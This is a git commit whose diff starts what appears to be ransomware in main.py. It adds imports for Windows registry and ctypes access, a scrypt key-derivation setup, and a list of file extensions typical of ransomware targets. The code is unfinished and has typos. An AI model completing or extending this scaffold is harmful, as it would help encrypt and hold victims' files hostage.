5fccd4977410aeedf80967390cb01f32faa65911
coding-is-FCKING-TOURTUR3 <Object-Oriented-Idiot@outlook.com>
2026-08-18 16:25:05 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,19 @@
-print('.')
+import os
+import sys
+import threading
+import ctypes
+import winreg
+import tkinker as tk
+from tkinter import messagebox
+from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+
+from pathlib import Path
+import secrets
+
+#generate encryption key...
+salt = secrets.token_bytes(16)
+#hash(password, salt, N=1<<14, r=8, p=1, buflen=64)
+
+
+#file name ending thing list
+file_suffixes = ['.txt', '.doc', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.zip', '.rar', '.7z', '.sql', '.db', '.cpp', '.py', '.html', '.css', '.js', ',json', '.xml', '.ppt', '.pptx']
